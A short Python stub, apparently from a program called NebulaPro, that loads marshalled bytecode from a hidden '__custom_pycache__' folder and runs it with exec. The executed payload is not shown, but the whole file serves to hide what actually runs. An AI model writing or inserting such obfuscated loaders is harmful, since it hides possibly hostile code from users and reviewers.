
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'NebulaPro_1b5f2d5180434718a8ef4f2e51d182bd.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
